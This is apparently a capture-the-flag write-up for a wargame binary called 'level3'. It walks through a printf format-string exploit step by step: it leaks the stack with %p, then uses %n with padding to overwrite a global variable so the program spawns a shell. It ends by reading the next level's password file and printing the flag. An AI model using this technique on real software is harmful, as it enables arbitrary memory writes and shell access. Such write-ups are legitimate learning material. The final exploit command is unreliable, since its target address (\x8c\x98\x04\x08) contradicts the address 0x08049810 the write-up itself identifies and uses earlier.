# level3

We find an executable `level3`. We examine it in Cutter. We determine the following :

- A `main` calls a `v` function
- `v` calls `fgets`, which is safe
- It then calls `printf` with our input, which is **not** safe
- The function assigns the value of variable `m` to `eax`
- It then compares `eax` to `64`
- If it's equal, it starts a `system("/bin/sh");` and we win

We have to exploit the `printf` function, in order to set the value of variable `m` to `64`.

## **The exploit**

When you ask `printf` for values without giving it any, it will just look for whatever's next in the stack. For example, `printf("%p\n")` will print the address of the next thing on the stack.

Even better, our input is also on the stack - which will be important to control printf's behaviour.

We want to have a look at the stack. We ask printf for a series of pointers, starting with `deadbeef` in hex, to find our buffer's place in the stack. We run :

```
python -c 'print("\xef\xbe\xad\xde %p %p %p %p")' | ./level3
```

We get :

```
ﾭ� 0x200 0xb7fd1ac0 0xb7ff37d0 0xdeadbeef
```

We see `0xdeadbeef`, the beginning of our input, is the fourth address.

Now, we want to do a couple things. First, we want to access the fourth pointer directly. We use the following syntax :

```
python -c 'print("\xef\xbe\xad\xde %4$p")' | ./level3
```

Next, we want to change our flag to something useful. `%n`, for example ; `%n` reads a pointer, and writes in it the number of bytes printed by printf so far. We change to :

```
python -c 'print("\xef\xbe\xad\xde" + "%4$n")' | ./level3
```

This will write the number of bytes (4, in this example) in the address `0xdeadbeef`. We could change this to an actual address. The address, of `m`, for example.

In gdb, we run `info variables` and find `m` is at `0x08049810`. We change our command again :

```
python -c 'print("\x10\x98\x04\x08" + "%4$n")' | ./level3
```

This will set `m` to `4`. Finally, we need to write more bytes, so the `%n` sets the value to `64`. We add 60 `A`'s :

```
python -c 'print("\x10\x98\x04\x08" + "A" * 60 + "%4$n")' | ./level3
```

We're ready to solve. We run the two-time `cat` block, as usual :

```
( python -c 'print("\x8c\x98\x04\x08" + "A" * 60 + "%4$n")' ; cat ) | ./level3
```

## **The flag**

It works ! In our interactive shell, we run :

```
cat /home/user/level4/.pass
```

... and get the flag for `level3` :

```
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```